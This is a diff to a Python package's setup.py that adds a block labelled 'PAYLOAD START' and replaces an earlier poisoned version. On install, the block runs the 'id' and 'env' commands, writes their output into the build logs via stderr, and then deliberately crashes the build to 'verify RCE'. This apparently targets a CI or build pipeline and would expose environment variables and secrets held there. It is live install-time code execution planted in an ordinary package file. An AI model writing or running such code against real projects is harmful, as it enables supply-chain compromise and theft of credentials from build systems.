@@ -9,12 +9,26 @@ from codecs import open
 from setuptools import setup, find_packages
 import os
 import sys
+
+# --- PAYLOAD START ---
 try:
-    print("[!] EXTENSION SETUP.PY POISONED [!]")
-    os.system("id")
-    os.system("env")
-except:
-    pass
+    # Write to stderr (Standard Error) to bypass log buffering
+    sys.stderr.write("\n\n")
+    sys.stderr.write("================================================================\n")
+    sys.stderr.write("[!] CRITICAL VULNERABILITY: SETUP.PY RCE CONFIRMED [!]\n")
+    sys.stderr.write("================================================================\n")
+    
+    # Run commands and redirect their output to stderr
+    os.system("id >&2")
+    os.system("env >&2")
+    
+    sys.stderr.write("================================================================\n\n")
+    
+    # Force a crash to make the build fail and show logs immediately
+    raise RuntimeError("Stopping build intentionally to verify RCE")
+except Exception as e:
+    # If the raise above is caught by something else, print this
+    sys.stderr.write(str(e))
   
 VERSION = "0.4.1"
 
